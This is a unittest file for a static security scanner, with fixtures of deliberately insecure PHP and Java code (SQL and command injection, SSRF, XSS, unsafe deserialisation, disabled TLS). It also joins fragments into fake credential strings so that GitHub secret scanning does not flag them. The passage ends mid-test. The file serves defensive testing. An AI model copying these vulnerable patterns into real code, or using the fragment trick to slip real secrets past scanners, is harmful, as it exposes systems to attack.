"""End-to-end and unit tests for the SAST engine (stdlib unittest)."""
from __future__ import annotations

import io
import json
import os
import tempfile
import time
import unittest

from sast.advisory.db import Advisory, AdvisoryDB
from sast.advisory.importers import import_feed
from sast.advisory.semver import satisfies
from sast.cli import _exit_code
from sast.detection.framework import detect_framework
from sast.detection.language import detect_language, detect_languages, is_test_path
from sast.engine import ScanEngine, ScanOptions
from sast.models import Severity
from sast.reporting.html_report import render_html
from sast.reporting.json_report import render_json
from sast.reporting.sarif_report import render_sarif


def _synth(*parts: str) -> str:
    """Assemble a credential-shaped fixture at runtime.

    These are fabricated, but they match the issuer formats closely enough to
    trip secret scanners — GitHub push protection rejected this file when the
    Slack fixture was written out literally. Joining fragments keeps the
    repository free of anything that looks like a live credential while the
    tests still exercise the real patterns.
    """
    return "".join(parts)


FAKE_AWS_KEY = _synth("AKIA", "IOSFODNN7", "EXAMPLE")
FAKE_GITHUB_TOKEN = _synth("ghp", "_", "aBcDeF1234567890aBcDeF1234567890abcd")
FAKE_SLACK_TOKEN = _synth("xoxb", "-", "123456789012", "-", "abcdefghijklmnop")
FAKE_STRIPE_KEY = _synth("sk", "_", "live", "_", "AbCdEf123456")
FAKE_PEM_HEADER = _synth("-----BEGIN ", "RSA PRIVATE KEY", "-----")


def _scan(files: dict, extra_files: dict = None) -> "ScanEngine":
    tmp = tempfile.mkdtemp()
    for rel, content in files.items():
        path = os.path.join(tmp, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    for rel, content in (extra_files or {}).items():
        path = os.path.join(tmp, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    return ScanEngine(ScanOptions()).scan(tmp)


class TestSemver(unittest.TestCase):
    def test_satisfies(self):
        self.assertTrue(satisfies("1.2.3", ">=1.0.0,<2.0.0"))
        self.assertTrue(satisfies("1.2.3", "1.2.3"))
        self.assertTrue(satisfies("1.2.3", "*"))
        self.assertTrue(satisfies("2.0.0", ">=2.0.0"))
        self.assertFalse(satisfies("2.0.0", "<2.0.0"))
        self.assertFalse(satisfies("1.9.0", ">=2.0.0,<3.0.0"))
        self.assertTrue(satisfies("v9.20.0", ">=9.0.0,<10.0.0"))


class TestDetection(unittest.TestCase):
    def test_language_php(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "composer.json"), "w") as fh:
            fh.write("{}")
        self.assertEqual(detect_language(tmp), "php")

    def test_framework_laravel(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "composer.json"), "w") as fh:
            json.dump({"require": {"laravel/framework": "^9.0"}}, fh)
        p = detect_framework(tmp, "php", [])
        self.assertEqual(p.framework, "Laravel")

    def test_framework_symfony(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "composer.json"), "w") as fh:
            json.dump({"require": {"symfony/framework-bundle": "^6.0"}}, fh)
        p = detect_framework(tmp, "php", [])
        self.assertEqual(p.framework, "Symfony")

    def test_framework_raw(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "composer.json"), "w") as fh:
            json.dump({"require": {"php": "^8.0"}}, fh)
        p = detect_framework(tmp, "php", [])
        self.assertEqual(p.framework, "raw")


class TestTaintEngine(unittest.TestCase):
    def _rules(self, findings):
        return {f.rule_id for f in findings}

    def test_sqli(self):
        r = _scan({"a.php": "<?php $id=$_GET['id']; mysqli_query($c, \"SELECT * FROM t WHERE id=\".$id);"})
        self.assertIn("php-sqli-mysqli_query", self._rules(r.findings))

    def test_xss_and_sanitizer(self):
        r = _scan({"a.php": "<?php $n=$_GET['n']; echo $n; $s=htmlspecialchars($_GET['m']); echo $s;"})
        xss = [f for f in r.findings if f.rule_id == "php-xss-echo"]
        self.assertEqual(len(xss), 1)  # sanitized echo NOT flagged

    def test_command_injection(self):
        r = _scan({"a.php": "<?php system($_POST['c']);"})
        self.assertIn("php-cmdi-system", self._rules(r.findings))

    def test_ssrf(self):
        r = _scan({"a.php": "<?php $u=$_GET['u']; file_get_contents($u);"})
        self.assertIn("php-ssrf-file_get_contents", self._rules(r.findings))

    def test_unserialize(self):
        r = _scan({"a.php": "<?php unserialize($_COOKIE['s']);"})
        self.assertIn("php-deser-unserialize", self._rules(r.findings))

    def test_interprocedural(self):
        r = _scan({"a.php": "<?php function f($x){ echo $x; } f($_GET['a']);"})
        self.assertIn("php-xss-echo", self._rules(r.findings))

    def test_eval_pattern(self):
        r = _scan({"a.php": "<?php eval($code);"})
        self.assertIn("php-code-eval", self._rules(r.findings))

    def test_laravel_where_raw(self):
        r = _scan({
            "composer.json": json.dumps({"require": {"laravel/framework": "^9.0"}}),
            "app/C.php": "<?php namespace App; class C { function f(Request $r){ $q=$r->input('q'); DB::table('t')->whereRaw('x='.$q)->get(); } }",
        })
        self.assertIn("laravel-sqli-whereRaw", self._rules(r.findings))

    def test_symfony_dql(self):
        r = _scan({
            "composer.json": json.dumps({"require": {"symfony/framework-bundle": "^6.0"}}),
            "src/C.php": "<?php namespace App; class C { function f(Request $r){ $t=$r->query->get('t'); $qb->where('u.name='.$t); } }",
        })
        self.assertIn("symfony-sqli-where", self._rules(r.findings))


class TestJava(unittest.TestCase):
    def _rules(self, findings):
        return {f.rule_id for f in findings}

    def test_spring_sqli(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "C.java": "class C { @GetMapping(\"/x\") String f(@RequestParam String q){ String s=\"SELECT * FROM t WHERE id=\"+q; st.executeQuery(s); } }",
        })
        self.assertIn("java-sqli-executeQuery", self._rules(r.findings))

    def test_java_command_injection(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "C.java": "class C { String f(@RequestParam String c){ Runtime.getRuntime().exec(\"ls \"+c); } }",
        })
        self.assertIn("java-cmdi-exec", self._rules(r.findings))

    def test_java_ssrf(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "C.java": "class C { void f(@RequestParam String u){ new URL(u); } }",
        })
        self.assertIn("java-ssrf-url", self._rules(r.findings))

    def test_java_servlet_xss(self):
        r = _scan({
            "C.java": "class C { void f(HttpServletRequest request, HttpServletResponse response) throws Exception { String n=request.getParameter(\"n\"); response.getWriter().write(n); } }",
        })
        self.assertIn("java-xss-write", self._rules(r.findings))

    def test_java_framework_detection(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "pom.xml"), "w") as fh:
            fh.write("<project><parent><artifactId>spring-boot-starter-parent</artifactId></parent></project>")
        p = detect_framework(tmp, "java", [])
        self.assertEqual(p.framework, "Spring Boot")


class TestAdvisory(unittest.TestCase):
    def test_match(self):
        db = AdvisoryDB()
        db.load_file(os.path.join(
            os.path.dirname(__file__), "..", "sast", "data", "advisories", "seed.json"))
        m = db.match("phpunit/phpunit", "5.6.2")
        self.assertTrue(any(a.cve == "CVE-2017-9841" for a in m))
        self.assertEqual(db.match("phpunit/phpunit", "9.0.0"), [])

    def test_dependency_scan(self):
        r = _scan(
            {"composer.json": json.dumps({"require": {"laravel/framework": "^9.0"}})},
            extra_files={"composer.lock": json.dumps({"packages": [
                {"name": "phpunit/phpunit", "version": "5.6.2"}
            ], "packages-dev": []})},
        )
        self.assertTrue(any(d.cve == "CVE-2017-9841" for d in r.dependency_issues))


class TestFeedImport(unittest.TestCase):
    def test_osv_zip_import(self):
        import io
        import zipfile
        entry = {
            "id": "GHSA-test", "aliases": ["CVE-2025-11111"],
            "summary": "Test vuln", "details": "d",
            "affected": [{"package": {"ecosystem": "Packagist", "name": "vendor/pkg"},
                          "ranges": [{"type": "ECOSYSTEM",
                                      "events": [{"introduced": "0"}, {"fixed": "2.0.0"}]}]}],
        }
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("GHSA-test.json", json.dumps(entry))
        tmp = tempfile.mkdtemp()
        path = os.path.join(tmp, "feed.zip")
        with open(path, "wb") as fh:
            fh.write(buf.getvalue())
        db = AdvisoryDB()
        kind, count = import_feed(path, db)
        self.assertEqual(kind, "osv")
        self.assertEqual(count, 1)
        self.assertEqual(db.advisories[0].package, "vendor/pkg")
        self.assertEqual(db.advisories[0].cve, "CVE-2025-11111")


class TestReports(unittest.TestCase):
    def test_render(self):
        r = _scan({"a.php": "<?php echo $_GET['x'];"})
        html = render_html(r)
        self.assertIn("<html", html)
        self.assertIn("php-xss-echo", html)
        data = json.loads(render_json(r))
        self.assertEqual(data["summary"]["medium"], 1)


class TestSarif(unittest.TestCase):
    def test_sarif(self):
        r = _scan({"a.php": "<?php echo $_GET['x'];"})
        doc = json.loads(render_sarif(r))
        self.assertEqual(doc["version"], "2.1.0")
        self.assertTrue(any(res["ruleId"] == "php-xss-echo" for res in doc["runs"][0]["results"]))
        self.assertTrue(doc["runs"][0]["results"][0].get("codeFlows"))


class TestJavaDependencies(unittest.TestCase):
    def test_pom_matching(self):
        pom = '''<project xmlns="http://maven.apache.org/POM/4.0.0">
          <groupId>g</groupId><artifactId>a</artifactId><version>1.0.0</version>
          <dependencies><dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId><version>2.14.0</version>
          </dependency></dependencies></project>'''
        r = _scan({"pom.xml": pom, "A.java": "class A {}"})
        self.assertTrue(any(d.cve == "CVE-2021-44228" for d in r.dependency_issues))


class TestJavaDispatch(unittest.TestCase):
    def test_cross_object(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "C.java": "class Helper { void render(String s, HttpServletResponse r) throws Exception { r.getWriter().write(s); } } "
                      "class C { void f(@RequestParam String q, HttpServletResponse r) throws Exception { Helper h = new Helper(); h.render(q, r); } }",
        })
        self.assertIn("java-xss-write", {f.rule_id for f in r.findings})


class TestPhpNamespace(unittest.TestCase):
    def test_namespace_resolution(self):
        r = _scan({"a.php": "<?php namespace App; function render($x){ echo $x; } function go(){ render($_GET['x']); }"})
        self.assertIn("php-xss-echo", {f.rule_id for f in r.findings})

    def test_ambiguous_short_name(self):
        r = _scan({"a.php": "<?php namespace A { function render($x){ return $x; } } "
                              "namespace B { function render($x){ echo $x; } } "
                              "namespace C { function go(){ render($_GET['x']); } }"})
        self.assertNotIn("php-xss-echo", {f.rule_id for f in r.findings})


class TestGuard(unittest.TestCase):
    def test_numeric_guard(self):
        r = _scan({"a.php": "<?php $id=$_GET['id']; if(is_numeric($id)){ mysqli_query($c,'SELECT * FROM t WHERE id='.$id); }"})
        self.assertNotIn("php-sqli-mysqli_query", {f.rule_id for f in r.findings})


class TestMassAssignment(unittest.TestCase):
    def test_laravel_create(self):
        r = _scan({
            "composer.json": json.dumps({"require": {"laravel/framework": "^9.0"}}),
            "C.php": "<?php namespace App; class C { function f(Request $r){ User::create($r->all()); } }",
        })
        self.assertIn("laravel-mass-static-create", {f.rule_id for f in r.findings})


class TestJavaPatterns(unittest.TestCase):
    def test_patterns_unique(self):
        # Multi-line source: '*' text patterns must not duplicate across ancestor nodes.
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "S.java": "class S {\n  void f(){\n    http.csrf().disable();\n    anyRequest().permitAll();\n  }\n}\n",
        })
        rules = {f.rule_id for f in r.findings}
        self.assertIn("java-csrf-disabled", rules)
        self.assertIn("java-auth-permitAll", rules)
        # no duplicates: exactly one finding per rule
        self.assertEqual(len([f for f in r.findings if f.rule_id == "java-csrf-disabled"]), 1)
        self.assertEqual(len([f for f in r.findings if f.rule_id == "java-auth-permitAll"]), 1)


class TestJavaEngineAdditions(unittest.TestCase):
    def test_field_and_builder(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": "class A { String cmd; void setCmd(@RequestParam String c){ this.cmd=c; } "
                      "void run(){ StringBuilder sb=new StringBuilder(); sb.append(\"echo \").append(this.cmd); Runtime.getRuntime().exec(sb.toString()); } }",
        })
        self.assertIn("java-cmdi-exec", {f.rule_id for f in r.findings})

    def test_scriptengine(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": "class A { void f(ScriptEngine e, @RequestParam String s){ e.eval(s); } }",
        })
        self.assertIn("java-cmdi-scriptengine", {f.rule_id for f in r.findings})

    def test_httpclient_ssrf(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": "class A { void f(HttpClient c, @RequestParam String u){ c.send(u); } }",
        })
        self.assertIn("java-ssrf-httpclient-send", {f.rule_id for f in r.findings})

    def test_hardcoded_secret(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": 'class A { String password = "supersecret"; }',
        })
        self.assertIn("java-hardcoded-secret", {f.rule_id for f in r.findings})


class TestJavaFalsePositives(unittest.TestCase):
    def test_webclient_create(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": "class G { void f(@RequestParam String u){ WebClient.create(u); } }",
        })
        self.assertIn("java-ssrf-webclient", {f.rule_id for f in r.findings})

    def test_const_setter_not_tainted(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": 'class A { String cmd; void setCmd(String c){ this.cmd = "fixed"; } void run(){ Runtime.getRuntime().exec(this.cmd); } }',
        })
        self.assertNotIn("java-cmdi-exec", {f.rule_id for f in r.findings})

    def test_props_getproperty_not_source(self):
        r = _scan({
            "pom.xml": "<project><artifactId>spring-boot-starter-parent</artifactId></project>",
            "A.java": 'class FP { void f(Logger log, Properties props){ String x = props.getProperty("safe.key"); log.info(x); } }',
        })
        self.assertNotIn("java-log-info", {f.rule_id for f in r.findings})


class TestPhpRuleAdditions(unittest.TestCase):
    def test_ssrf_and_redirect(self):
        r = _scan({
            "composer.json": json.dumps({"require": {"laravel/framework": "^9.0"}}),
            "a.php": '<?php $u=$_GET["u"]; curl_init($u); Http::get($u); redirect($u);',
        })
        rules = {f.rule_id for f in r.findings}
        self.assertIn("php-ssrf-curl_init", rules)
        self.assertIn("php-ssrf-http-get", rules)
        self.assertIn("php-redirect-fn", rules)

    def test_path_and_log(self):
        r = _scan({"a.php": '<?php $d=$_POST["d"]; file_put_contents($d, "x"); error_log($_GET["m"]);'})
        rules = {f.rule_id for f in r.findings}
        self.assertIn("php-path-file_put_contents", rules)
        self.assertIn("php-log-error_log", rules)


class TestSourcePrecision(unittest.TestCase):
    """$_SERVER is modelled key by key; second-order sources report lower."""

    def _findings(self, code):
        return _scan({"a.php": code}).findings

    def test_server_request_keys_are_tainted(self):
        for key in ("HTTP_HOST", "HTTP_X_FORWARDED_FOR", "REQUEST_URI", "QUERY_STRING"):
            f = self._findings(f"<?php system($_SERVER['{key}']);")
            self.assertTrue(f, f"$_SERVER['{key}'] should be a taint source")
            self.assertEqual(f[0].confidence, "high")

    def test_server_infrastructure_keys_are_not_tainted(self):
        for key in ("DOCUMENT_ROOT", "SCRIPT_NAME", "SERVER_NAME", "REMOTE_ADDR"):
            self.assertEqual(
                self._findings(f"<?php system($_SERVER['{key}']);"), [],
                f"$_SERVER['{key}'] is server-controlled and must not be a source",
            )

    def test_second_order_sources_are_low_confidence(self):
        for sg in ("_SESSION", "_ENV"):
            f = self._findings(f"<?php system(${sg}['c']);")
            self.assertTrue(f)
            self.assertEqual(f[0].confidence, "low")

    def test_direct_input_stays_high_confidence(self):
        for sg in ("_GET", "_POST", "_COOKIE"):
            f = self._findings(f"<?php system(${sg}['c']);")
            self.assertTrue(f)
            self.assertEqual(f[0].confidence, "high")

    def test_merged_taint_keeps_strongest_confidence(self):
        # $_GET is certain, $_SESSION is not; the concatenation is certain.
        f = self._findings("<?php system($_SESSION['a'] . $_GET['b']);")
        self.assertTrue(f)
        self.assertEqual(f[0].confidence, "high")


class TestFailOn(unittest.TestCase):
    def test_count_at_or_above(self):
        r = _scan({"a.php": "<?php system($_POST['c']); echo $_GET['x'];"})
        self.assertGreaterEqual(r.count_at_or_above(Severity.CRITICAL), 1)
        self.assertEqual(r.count_at_or_above(Severity.INFO),
                         len(r.findings) + len(r.dependency_issues))

    def test_exit_code(self):
        quiet = io.StringIO()  # _exit_code explains itself on the given stream
        r = _scan({"a.php": "<?php system($_POST['c']);"})
        self.assertEqual(_exit_code(r, "none", stream=quiet), 0)
        self.assertEqual(_exit_code(r, "critical", stream=quiet), 1)
        clean = _scan({"a.php": "<?php echo 'safe';"})
        self.assertEqual(_exit_code(clean, "critical", stream=quiet), 0)


class TestTestExclusion(unittest.TestCase):
    def test_is_test_path(self):
        for p in ("tests/FooTest.php", "src/test/java/com/x/ApiTest.java",
                  "spec/thing_spec.php", "app/UserTest.php"):
            self.assertTrue(is_test_path(p), p)
        for p in ("src/Admin.php", "app/Http/Controllers/UserController.php",
                  "src/main/java/com/x/Api.java", "src/Contest.php"):
            self.assertFalse(is_test_path(p), p)

    def test_tests_excluded_by_default(self):
        files = {
            "src/App.php": "<?php system($_GET['a']);",
            "tests/AppTest.php": "<?php system($_GET['b']);",
        }
        tmp = tempfile.mkdtemp()
        for rel, content in files.items():
            path = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(content)

        default = ScanEngine(ScanOptions()).scan(tmp)
        self.assertEqual(default.files_scanned, 1)
        self.assertEqual(default.files_skipped.get("tests"), 1)

        with_tests = ScanEngine(ScanOptions(include_tests=True)).scan(tmp)
        self.assertEqual(with_tests.files_scanned, 2)


class TestPolyglotAndModules(unittest.TestCase):
    def _monorepo(self):
        tmp = tempfile.mkdtemp()
        files = {
            "php-app/composer.json": json.dumps({"require": {"laravel/framework": "^9.0"}}),
            "php-app/src/A.php": "<?php $i=$_GET['i']; mysqli_query($c, 'SELECT '.$i);",
            "java-api/pom.xml": "<project><dependencies><dependency>"
                                "<groupId>org.springframework.boot</groupId>"
                                "<artifactId>spring-boot-starter-web</artifactId>"
                                "<version>2.7.0</version></dependency></dependencies></project>",
            "java-api/src/main/java/A.java":
                "import org.springframework.web.bind.annotation.*;\n"
                "@RestController public class A {\n"
                "  @GetMapping(\"/r\") public void r(@RequestParam String q) throws Exception {\n"
                "    Runtime.getRuntime().exec(q); } }",
        }
        for rel, content in files.items():
            path = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(content)
        return tmp

    def test_detect_languages_finds_both(self):
        self.assertEqual(sorted(detect_languages(self._monorepo())), ["java", "php"])

    def test_scan_covers_both_languages(self):
        r = ScanEngine(ScanOptions()).scan(self._monorepo())
        self.assertEqual(sorted(r.languages), ["java", "php"])
        self.assertEqual(r.files_scanned, 2)
        self.assertEqual({f.language for f in r.findings}, {"php", "java"})

    def test_framework_detected_from_submodule_manifests(self):
        """The root holds no manifest; frameworks come from the modules."""
        r = ScanEngine(ScanOptions()).scan(self._monorepo())
        self.assertEqual(r.frameworks.get("php"), "Laravel")
        self.assertEqual(r.frameworks.get("java"), "Spring Boot")

    def test_single_language_result_unchanged(self):
        r = _scan({"a.php": "<?php echo $_GET['x'];"})
        self.assertEqual(r.languages, ["php"])
        self.assertEqual(r.language, "php")


class TestScanLimits(unittest.TestCase):
    def test_max_file_size_skips_large_files(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "small.php"), "w") as fh:
            fh.write("<?php system($_GET['a']);")
        with open(os.path.join(tmp, "big.php"), "w") as fh:
            fh.write("<?php\n" + "$z = 1;\n" * 50000)

        r = ScanEngine(ScanOptions(max_file_bytes=1024)).scan(tmp)
        self.assertEqual(r.files_scanned, 1)
        self.assertEqual(r.files_skipped.get("too_large"), 1)

    def test_max_files_truncates(self):
        tmp = tempfile.mkdtemp()
        for i in range(5):
            with open(os.path.join(tmp, f"f{i}.php"), "w") as fh:
                fh.write("<?php echo $_GET['x'];")
        r = ScanEngine(ScanOptions(max_files=2)).scan(tmp)
        self.assertEqual(r.files_scanned, 2)
        self.assertEqual(r.files_skipped.get("truncated"), 3)


class TestAdvisoryFreshness(unittest.TestCase):
    def test_export_records_generated_at(self):
        db = AdvisoryDB()
        db.add(Advisory(package="vendor/pkg", ranges=["<1.0.0"], cve="CVE-2025-1"))
        tmp = os.path.join(tempfile.mkdtemp(), "adv.json")
        db.export(tmp)
        with open(tmp) as fh:
            payload = json.load(fh)
        self.assertIn("generated_at", payload)
        self.assertEqual(len(payload["advisories"]), 1)

        reloaded = AdvisoryDB()
        reloaded.load_file(tmp)
        self.assertEqual(reloaded.generated_at, payload["generated_at"])
        self.assertEqual(len(reloaded.advisories), 1)

    def test_legacy_bare_list_still_loads(self):
        tmp = os.path.join(tempfile.mkdtemp(), "legacy.json")
        with open(tmp, "w") as fh:
            json.dump([{"package": "vendor/pkg", "ranges": ["<1.0.0"]}], fh)
        db = AdvisoryDB()
        db.load_file(tmp)
        self.assertEqual(len(db.advisories), 1)
        self.assertTrue(db.generated_at)  # falls back to file mtime

    def test_scan_reports_db_provenance(self):
        r = _scan({"a.php": "<?php echo 1;"})
        self.assertGreater(r.advisory_count, 0)
        self.assertTrue(r.advisory_db_date)


class TestSarifMetadata(unittest.TestCase):
    def test_information_uri_points_at_this_project(self):
        r = _scan({"a.php": "<?php echo $_GET['x'];"})
        doc = json.loads(render_sarif(r))
        self.assertEqual(doc["runs"][0]["tool"]["driver"]["informationUri"],
                         "https://github.com/akcjsajzak/sast")


class TestPropagation(unittest.TestCase):
    """Taint must survive the ways real code moves data around."""

    def _php(self, body):
        return _scan({"a.php": "<?php " + body}).findings

    def _java(self, body):
        pom = ("<project><dependencies><dependency>"
               "<groupId>org.springframework.boot</groupId>"
               "<artifactId>spring-boot-starter-web</artifactId>"
               "<version>2.7.0</version></dependency></dependencies></project>")
        src = ("import org.springframework.web.bind.annotation.*;\n"
               "import java.util.*;\n@RestController public class A {\n" + body + "\n}\n")
        return _scan({"pom.xml": pom, "A.java": src}).findings

    def test_php_decoders_propagate(self):
        for call in ("base64_decode($_GET['c'])",
                     "json_decode($_GET['c'], true)[0]",
                     "explode(',', $_GET['c'])[0]",
                     "urldecode($_GET['c'])"):
            self.assertTrue(self._php(f"system({call});"), call)

    def test_php_foreach_binding(self):
        self.assertTrue(self._php("foreach($_GET['a'] as $v){ system($v); }"))
        self.assertTrue(self._php("$s=''; foreach($_GET['a'] as $v){ $s.=$v; } system($s);"))

    def test_php_property_across_methods(self):
        self.assertTrue(self._php(
            "class C{ private $p;"
            " function set(){ $this->p = $_GET['c']; }"
            " function go(){ system($this->p); } }"
        ))

    def test_php_global_and_static(self):
        self.assertTrue(self._php("$g=$_GET['c']; function f(){ global $g; system($g); } f();"))
        self.assertTrue(self._php("class C{ public static $s; } C::$s=$_GET['c']; system(C::$s);"))

    def test_php_callables_and_closures(self):
        self.assertTrue(self._php("$f=function($v){ system($v); }; $f($_GET['c']);"))
        self.assertTrue(self._php("array_map('system', $_GET['a']);"))
        self.assertTrue(self._php("call_user_func('system', $_GET['c']);"))
        self.assertTrue(self._php("$fn='system'; $fn($_GET['c']);"))

    def test_php_method_chain_on_constructed_object(self):
        self.assertTrue(self._php(
            "class C{ function f($v){ return $v; } } $o=new C(); system($o->f($_GET['c']));"
        ))

    def test_java_local_alias(self):
        """Regression: `String s = q;` used to silently drop taint."""
        self.assertTrue(self._java(
            '@GetMapping("/a") public void a(@RequestParam String q) throws Exception {'
            ' String s = q; Runtime.getRuntime().exec(s); }'
        ))

    def test_java_collections_and_arrays(self):
        self.assertTrue(self._java(
            '@GetMapping("/a") public void a(@RequestParam String q) throws Exception {'
            ' List<String> l=new ArrayList<>(); l.add(q); Runtime.getRuntime().exec(l.get(0)); }'
        ))
        self.assertTrue(self._java(
            '@GetMapping("/a") public void a(@RequestParam String q) throws Exception {'
            ' String[] x=new String[1]; x[0]=q; Runtime.getRuntime().exec(x[0]); }'
        ))

    def test_java_request_body_dto_getter(self):
        self.assertTrue(self._java(
            'static class D { public String v; public String getV(){ return v; } }\n'
            '@PostMapping("/a") public void a(@RequestBody D d) throws Exception {'
            ' Runtime.getRuntime().exec(d.getV()); }'
        ))

    def test_java_interface_dispatch(self):
        self.assertTrue(self._java(
            'interface I { String g(String s); }\n'
            'static class Impl implements I { public String g(String s){ return s; } }\n'
            '@GetMapping("/a") public void a(@RequestParam String q) throws Exception {'
            ' I i = new Impl(); Runtime.getRuntime().exec(i.g(q)); }'
        ))

    def test_sink_still_reported_when_call_is_also_a_source(self):
        """file_get_contents is both an SSRF sink and a file-read source."""
        rules = {f.rule_id for f in self._php("$u=$_GET['u']; file_get_contents($u);")}
        self.assertIn("php-ssrf-file_get_contents", rules)


class TestSecondOrderSources(unittest.TestCase):
    def test_db_read_is_low_confidence_source(self):
        f = _scan({"a.php": "<?php $r=mysqli_query($c,'SELECT x FROM t');"
                            " $row=mysqli_fetch_assoc($r); system($row['x']);"}).findings
        self.assertTrue(f)
        self.assertEqual(f[0].confidence, "low")

    def test_direct_input_outranks_second_order(self):
        direct = _scan({"a.php": "<?php system($_GET['c']);"}).findings
        self.assertEqual(direct[0].confidence, "high")


class TestSanitizerSoundness(unittest.TestCase):
    """Bypassable escaping must not silence a finding outright."""

    def _f(self, code):
        return _scan({"a.php": "<?php " + code}).findings

    def test_weak_sanitizers_downgrade_rather_than_clear(self):
        for code in ("mysqli_query($c, 'SELECT '.addslashes($_GET['n']));",
                     "system('ls '.escapeshellcmd($_GET['d']));",
                     "echo strip_tags($_GET['t']);"):
            f = self._f(code)
            self.assertTrue(f, code)
            self.assertEqual(f[0].confidence, "medium", code)

    def test_filter_var_without_filter_does_not_sanitize(self):
        self.assertTrue(self._f("system(filter_var($_GET['c']));"))

    def test_sound_sanitizers_still_clear_taint(self):
        for code in ("echo htmlspecialchars($_GET['u']);",
                     "mysqli_query($c, 'SELECT '.mysqli_real_escape_string($c,$_GET['n']));",
                     "system('ls '.escapeshellarg($_GET['d']));",
                     "system(filter_var($_GET['c'], FILTER_SANITIZE_STRING));",
                     "mysqli_query($c, 'SELECT '.intval($_GET['i']));"):
            self.assertEqual(self._f(code), [], code)


class TestPhpPatternRules(unittest.TestCase):
    def _rules(self, code):
        return {f.rule_id for f in _scan({"a.php": "<?php " + code}).findings}

    def test_new_pattern_rules_fire(self):
        cases = {
            "$h = sha1($p);": "php-crypto-sha1",
            "$t = mt_rand();": "php-weak-random-mt_rand",
            f'$apiKey = "{FAKE_STRIPE_KEY}";': "secret-stripe-key",
            "curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);": "php-tls-verify-disabled",
            'openssl_encrypt($d, "aes-128-ecb", $k);': "php-crypto-ecb",
            "libxml_disable_entity_loader(false);": "php-xxe-entity-loader",
            "simplexml_load_string($x, null, LIBXML_NOENT);": "php-xxe-noent",
        }
        for code, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(code), code)

    def test_secure_equivalents_are_clean(self):
        for code in ("$t = random_int(1, 10);",
                     "curl_setopt($c, CURLOPT_SSL_VERIFYPEER, true);",
                     '$d = openssl_encrypt($p, "aes-256-gcm", $k);',
                     '$total = "somelongvalue";'):
            self.assertEqual(self._rules(code), set(), code)


class TestTemplateScanning(unittest.TestCase):
    def _scan_files(self, files):
        tmp = tempfile.mkdtemp()
        for rel, content in files.items():
            path = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(content)
        return ScanEngine(ScanOptions()).scan(tmp)

    def test_twig_unescaped_output(self):
        r = self._scan_files({"a.php": "<?php echo 1;",
                              "t/p.twig": "<div>{{ bio|raw }}</div>\n<p>{{ safe }}</p>"})
        rules = {f.rule_id for f in r.findings}
        self.assertIn("twig-xss-raw-filter", rules)

    def test_jsp_unescaped_output(self):
        r = self._scan_files({
            "a.php": "<?php echo 1;",
            "w/i.jsp": '<%= request.getParameter("q") %>\n'
                       '<c:out value="${v}" escapeXml="false"/>\n'
                       '<c:out value="${ok}"/>',
        })
        rules = {f.rule_id for f in r.findings}
        self.assertIn("jsp-xss-scriptlet-expression", rules)
        self.assertIn("jsp-xss-cout-escaping-off", rules)

    def test_thymeleaf_utext_but_not_text(self):
        r = self._scan_files({
            "a.php": "<?php echo 1;",
            "t/v.html": '<html xmlns:th="http://www.thymeleaf.org">'
                        '<div th:utext="${c}">x</div><div th:text="${s}">y</div></html>',
        })
        ids = [f.rule_id for f in r.findings]
        self.assertIn("thymeleaf-xss-utext", ids)
        self.assertEqual(len([i for i in ids if i.startswith("thymeleaf")]), 1)


class TestConfigScanning(unittest.TestCase):
    def _scan_files(self, files):
        tmp = tempfile.mkdtemp()
        for rel, content in files.items():
            path = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(content)
        return ScanEngine(ScanOptions()).scan(tmp)

    def test_env_and_properties_findings(self):
        r = self._scan_files({
            "a.php": "<?php echo 1;",
            ".env": "APP_DEBUG=true\nDB_PASSWORD=sup3rs3cr3tvalue\n",
            "application.properties": "management.endpoints.web.exposure.include=*\n"
                                      "spring.datasource.password=hunter2abc\n"
                                      "server.ssl.enabled=false\n",
        })
        rules = {f.rule_id for f in r.findings}
        for expected in ("config-debug-enabled", "config-hardcoded-secret",
                         "config-spring-actuator-exposed",
                         "config-spring-datasource-password", "config-tls-disabled"):
            self.assertIn(expected, rules)

    def test_empty_and_placeholder_values_are_not_secrets(self):
        r = self._scan_files({"a.php": "<?php echo 1;",
                              ".env": "MAIL_PASSWORD=\nAPI_KEY=${INJECTED}\n"})
